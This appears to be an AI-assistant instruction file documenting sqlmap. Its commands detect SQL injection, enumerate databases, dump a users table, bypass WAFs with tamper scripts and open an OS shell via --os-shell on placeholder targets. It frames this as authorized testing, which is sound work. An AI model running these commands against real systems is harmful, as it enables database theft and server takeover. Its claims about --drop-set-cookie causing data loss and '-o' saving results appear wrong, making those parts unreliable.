---
applyTo: "**/*.r **/*.sh **/*.sql"
---

# Sqlmap

Automated SQL injection testing with sqlmap: detection, database enumeration, and data extraction.

## Instructions

# sqlmap

Open-source penetration testing tool that automates detecting and exploiting SQL
injection flaws and taking over database servers.

## When to Use

- Authorized penetration tests of web applications
- Confirming a suspected SQL injection point
- Extracting schema and data for proof of exploitation

## Real Commands

```bash
# Basic detection (non-interactive)
sqlmap -u "http://target.example.com/item?id=1" --batch

# Enumerate databases
sqlmap -u "http://target.example.com/item?id=1" --dbs

# Tables in a database
sqlmap -u "http://target.example.com/item?id=1" -D appdb --tables

# Dump a table
sqlmap -u "http://target.example.com/item?id=1" -D appdb -T users --dump --threads=4

# From a captured request file
sqlmap -r request.txt --level=3 --risk=2

# WAF bypass with tamper scripts
sqlmap -u "http://target?id=1" --tamper=space2comment

# Current user/db info
sqlmap -u "http://target?id=1" --current-user --current-db --batch
```

## Responsibility Notes

- Only test systems you own or have written permission to test
- Use `--batch` to accept defaults safely during scripted runs
- Start with `--level 1 --risk 1` and increase gradually
- The tool can cause data loss on fragile backends (e.g. `--drop-set-cookie`)

## Best Practices

- Capture the request with the exact parameters (cookie, CSRF) via `-r` file
- Always dump to a file: `--dump -o results`
- Check `--technique=BET` to limit to Boolean/Error/Time tests if speed matters

## Example Response

Confirms injection point, backend DBMS and version, then enumerates databases,
tables, and dumps rows with the extracted payload used.

## Capabilities

### sqlmap-injection
Detect and exploit SQL injection, enumerate databases and tables, and dump data

**Commands:**
- `sqlmap -u "http://localhost:8080/item?id=1" --batch`
- `sqlmap -u "http://localhost:8080/item?id=1" --dbs`
- `sqlmap -u "http://localhost:8080/item?id=1" -D appdb --tables`
- `sqlmap -u "http://localhost:8080/item?id=1" -D appdb -T users --dump --threads=4`
- `sqlmap -r request.txt --level=3 --risk=2 --tamper=space2comment`

**Examples:**
- sqlmap -u "http://target?id=1" --current-user --current-db
- sqlmap -u "http://target?id=1" --os-shell
- sqlmap -u "http://target?id=1" --batch --smart
